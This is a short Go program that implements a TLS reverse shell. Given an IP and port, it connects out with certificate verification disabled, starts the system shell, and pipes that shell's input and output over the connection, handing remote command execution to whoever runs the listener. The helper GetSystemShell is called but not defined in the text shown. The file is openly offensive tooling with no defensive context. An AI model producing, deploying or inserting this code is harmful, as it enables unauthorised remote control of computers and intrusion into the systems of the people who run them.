package main

import (
	"fmt"
	"crypto/tls"
//	"log"
//	"net"
	"os"
	"os/exec"
	"io"
)

func exists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return true
}

func main() {
	if len(os.Args) <= 2 {
		fmt.Printf("Usage: %s <ip> <port>", os.Args[0])
		os.Exit(1)
	}
	conf := &tls.Config{
		InsecureSkipVerify: true,
	}
	conn, _ := tls.Dial("tcp", fmt.Sprintf("%s:%s", os.Args[1], os.Args[2]), conf)
	shellPath := GetSystemShell()

	conn.Write([]byte(shellPath + "\n"))

	var cmd *exec.Cmd
	cmd = exec.Command(shellPath)

	stdin, _ := cmd.StdinPipe()
	stdout, _ := cmd.StdoutPipe()
	stderr, _ := cmd.StderrPipe()
	
	cmd.Start()
	
	go func() {
		io.Copy(stdin, conn)
		/*buf := make([]byte, 1024)
		for {
			n, err := conn.Read(buf)
			if err != nil {
				break
			}
			stdin.Write(buf[:n])
		}*/
	}()
	
	go func() {
		io.Copy(conn, stdout)
		/*buf := make([]byte, 1024)
		for {
			n, err := stdout.Read(buf)
			if err != nil {
				break
			}
			conn.Write(buf[:n])
		}*/
	}()
	
	io.Copy(conn, stderr)
	/*buf := make([]byte, 1024)
	for {
		n, err := stderr.Read(buf)
		if err != nil {
			break
		}
		conn.Write(buf[:n])
	}*/
}
